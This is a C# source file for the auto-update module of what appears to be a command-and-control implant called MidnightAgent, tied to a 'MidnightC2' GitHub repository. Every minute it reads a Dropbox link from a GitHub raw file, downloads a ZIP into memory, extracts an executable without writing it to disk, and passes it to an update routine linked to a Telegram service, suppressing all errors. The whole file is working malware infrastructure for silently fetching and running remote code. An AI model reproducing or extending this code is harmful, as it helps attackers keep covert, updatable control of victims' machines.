using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Threading;

namespace MidnightAgent.Core
{
    /// <summary>
    /// Auto updater - checks for updates by downloading ZIP from Dropbox
    /// Flow: GitHub txt → Dropbox URL → Download ZIP to RAM → Extract in RAM
    ///       → Read version.txt inside ZIP → Compare version → Update from exe bytes
    /// ZIP contains: version.txt ("v = X.Y.Z\nd = filename.exe") + the actual exe
    /// </summary>
    public static class AutoUpdater
    {
        // GitHub Raw URL pointing to the Dropbox download link
        private const string UpdateConfigUrl = "https://raw.githubusercontent.com/teelawat/MidnightC2/refs/heads/main/dropbox-url-update.txt";
        
        private static Timer _timer;

        public static void Start(CancellationToken token)
        {
            Logger.Log("AutoUpdater started (In-Memory ZIP)");
            
            // Check every 1 minute
            _timer = new Timer(CheckForUpdateCallback, null, TimeSpan.FromMinutes(1), TimeSpan.FromMinutes(1));
            
            token.Register(() =>
            {
                _timer?.Dispose();
                Logger.Log("AutoUpdater stopped");
            });
        }

        private static void CheckForUpdateCallback(object state)
        {
            byte[] zipData = null;
            byte[] exeBytes = null;
            try
            {
                // 1. Get Dropbox URL from GitHub
                string dropboxUrl = DownloadString(UpdateConfigUrl);
                if (string.IsNullOrEmpty(dropboxUrl)) return;

                // 2. Download ZIP to RAM
                zipData = DownloadBytes(dropboxUrl);
                if (zipData == null || zipData.Length == 0) return;

                // 3. Extract ZIP in memory and read version.txt
                string remoteVersion = null;
                string exeFileName = null;

                using (var zipStream = new MemoryStream(zipData))
                using (var archive = new ZipArchive(zipStream, ZipArchiveMode.Read))
                {
                    // Find and read version.txt inside ZIP
                    var versionEntry = archive.GetEntry("version.txt");
                    if (versionEntry == null) return;

                    using (var reader = new StreamReader(versionEntry.Open()))
                    {
                        string versionContent = reader.ReadToEnd();
                        var lines = versionContent.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                        foreach (var line in lines)
                        {
                            if (line.StartsWith("v = ")) remoteVersion = line.Substring(4).Trim();
                            if (line.StartsWith("d = ")) exeFileName = line.Substring(4).Trim();
                        }
                    }

                    if (string.IsNullOrEmpty(remoteVersion) || string.IsNullOrEmpty(exeFileName)) return;

                    // 4. Compare versions - only update if remote is newer
                    if (!IsNewerVersion(remoteVersion, Config.Version)) return;

                    Logger.Log($"New update available: {remoteVersion} (current: {Config.Version})");

                    // 5. Extract the exe from ZIP into memory
                    var exeEntry = archive.GetEntry(exeFileName);
                    if (exeEntry == null) return;

                    using (var exeStream = exeEntry.Open())
                    using (var ms = new MemoryStream())
                    {
                        exeStream.CopyTo(ms);
                        exeBytes = ms.ToArray();
                    }
                }

                if (exeBytes == null || exeBytes.Length == 0) return;

                // Ensure TelegramInstance is set
                if (Features.UpdateFeature.TelegramInstance == null)
                {
                    Features.UpdateFeature.TelegramInstance = new Telegram.TelegramService();
                }

                // 6. Trigger Update from RAM
                var updater = new Features.UpdateFeature();
                updater.PerformUpdateFromBytes(exeBytes, remoteVersion).Wait();
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"AutoUpdate Error: {ex.Message}");
            }
            finally
            {
                // CRITICAL: Cleanup large arrays to prevent memory leaks
                zipData = null;
                exeBytes = null;
                GC.Collect(2, GCCollectionMode.Forced);
            }
        }

        private static string DownloadString(string url)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Timeout = 15000;
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    return reader.ReadToEnd().Trim();
                }
            }
            catch { return null; }
        }

        private static byte[] DownloadBytes(string url)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Timeout = 60000; // 60s for large ZIP
                
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream responseStream = response.GetResponseStream())
                using (MemoryStream ms = new MemoryStream())
                {
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        ms.Write(buffer, 0, bytesRead);
                    }
                    return ms.ToArray();
                }
            }
            catch { return null; }
        }

        private static bool IsNewerVersion(string remote, string current)
        {
            try
            {
                var v1 = new Version(remote);
                var v2 = new Version(current);
                return v1 > v2;
            }
            catch { return false; }
        }
    }
}
